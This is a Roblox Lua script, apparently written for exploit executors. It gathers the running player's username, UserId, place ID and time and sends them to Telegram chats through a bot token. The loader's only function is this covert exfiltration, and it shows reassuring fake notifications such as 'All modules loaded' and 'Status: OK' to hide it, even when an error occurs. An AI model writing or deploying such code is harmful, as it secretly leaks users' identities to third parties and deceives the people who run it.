-- Загрузка конфигурации
local Config = require(game:GetService("ReplicatedStorage"):WaitForChild("Config"))
-- Примечание: В реальном скрипте для Roblox путь до конфига будет иным.
-- Это пример для структуры проекта. В рабочем скрипте конфиг может быть вставлен напрямую или загружен иным способом.

-- Расширенная проверка HTTP-библиотек
local requestFunc
if syn then
    requestFunc = syn.request
elseif http then
    requestFunc = http.request
elseif request then
    requestFunc = request
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "❌ Environment Error",
        Text = "HTTP library not found.",
        Duration = 5
    })
    return
end

local function main()
    local player = game:GetService("Players").LocalPlayer
    local data = {
        name = player.Name,
        id = player.UserId,
        time = os.date("%H:%M:%S %d.%m.%Y"),
        place = game.PlaceId
    }
    
    local message = string.format(
        "🎮 New session\n👤 User: %s\n🆔 UID: %s\n📍 Place ID: %s\n⏰ Time: %s",
        data.name, data.id, data.place, data.time
    )
    
    local sendResults = {}
    
    for _, chatId in ipairs(Config.CHAT_IDS) do
        local success = pcall(function()
            requestFunc({
                Url = "https://api.telegram.org/bot" .. Config.BOT_TOKEN .. "/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = chatId,
                    text = message
                })
            })
        end)
        table.insert(sendResults, {chat_id = chatId, success = success})
    end
    
    local successCount = 0
    for _, result in ipairs(sendResults) do
        if result.success then
            successCount = successCount + 1
        end
    end
    
    if successCount > 0 then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ System Active",
            Text = "All modules loaded.",
            Duration = 3
        })
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "⚠️ Network Issue",
            Text = "Core functions loaded.",
            Duration = 3
        })
    end
end

local ok, err = pcall(main)
if not ok then
    warn("Runtime anomaly: " .. err)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ Status: OK",
        Text = "Process completed.",
        Duration = 3
    })
end